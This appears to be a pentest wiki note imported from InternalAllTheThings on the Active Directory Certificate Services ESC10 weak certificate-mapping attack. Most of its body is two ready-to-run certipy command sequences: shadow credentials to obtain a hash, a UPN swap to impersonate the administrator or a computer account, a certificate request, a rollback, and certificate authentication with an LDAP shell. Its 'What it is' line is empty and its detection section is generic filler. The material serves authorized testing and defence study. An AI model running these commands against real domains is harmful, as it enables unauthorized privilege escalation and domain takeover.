---
title: Active Directory - Certificate ESC10
type: technique
tags: [active-directory, adcs, certificates, esc10, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC10

## What it is

**Requirements**:.

## How it works

ESC10 exploits weak certificate-to-account binding when `StrongCertificateBindingEnforcement` is set to `0` or `1` (non-strict). When the binding is weak, the DC accepts a certificate for authentication even if the account's UPN was changed after the certificate was issued. An attacker with `GenericWrite` over an account modifies the account's UPN to match a target user, requests a standard certificate, then reverts the UPN; the certificate still authenticates as the target because the mapping check is not enforced.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement

**Requirements**:

* `StrongCertificateBindingEnforcement` = 0.

**Exploit**:

```ps1
# get user hash with shadowcredentials
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN
certipy account update -username "user@domain.local" -p "password" -user admin -upn administrator -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "hashes" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect with the certificate
certipy auth -pfx 'administrator.pfx' -domain "domain.local" -dc-ip 10.10.10.10
```

## ESC10 – Weak Certificate Mapping - CertificateMappingMethods

**Requirements**:

* `CertificateMappingMethods` = 0x04.

**Exploit**:

```ps1
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN to computer$
certipy account update -username "user@domain.local" -p "password" -user admin -upn 'computer$@domain.local' -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "3b60abbc25770511334b3829866b08f1" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect via schannel with the certificate 
certipy auth -pfx 'computer.pfx' -domain "domain.local" -dc-ip 10.10.10.10 -ldap-shell
```

## References

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[certipy]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
